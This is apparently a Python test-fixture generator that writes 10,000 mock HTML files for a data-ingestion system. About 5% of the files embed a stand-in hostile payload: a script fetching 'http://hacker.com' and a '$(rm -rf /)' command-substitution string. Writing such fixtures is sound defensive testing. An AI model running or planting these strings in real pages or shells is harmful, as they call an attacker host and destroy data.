import os
import random
import tempfile

MOCK_DIR = tempfile.mkdtemp(prefix="nexus_internet_mock-")

def generate_mocks():
    os.makedirs(MOCK_DIR, exist_ok=True)
    print(f"Generating 10,000 mock payloads in {MOCK_DIR}...")
    
    for i in range(10000):
        filepath = os.path.join(MOCK_DIR, f"payload_{i}.html")
        
        # 5% chance of malicious payload
        if random.random() < 0.05:
            content = f"<html><body><script>fetch('http://hacker.com')</script>; $(rm -rf /) Malicious Payload {i}</body></html>"
        # 1% chance of massive memory payload (RAM leak test)
        elif random.random() < 0.01:
            content = "<html><body>" + ("<div>Infinite Nesting</div>" * 5000) + "</body></html>"
        else:
            content = f"<html><body><p>Standard data content for index {i}. Data Nexus will learn from this.</p></body></html>"
            
        with open(filepath, "w") as f:
            f.write(content)
            
    print("Mock generation complete.")

if __name__ == "__main__":
    generate_mocks()
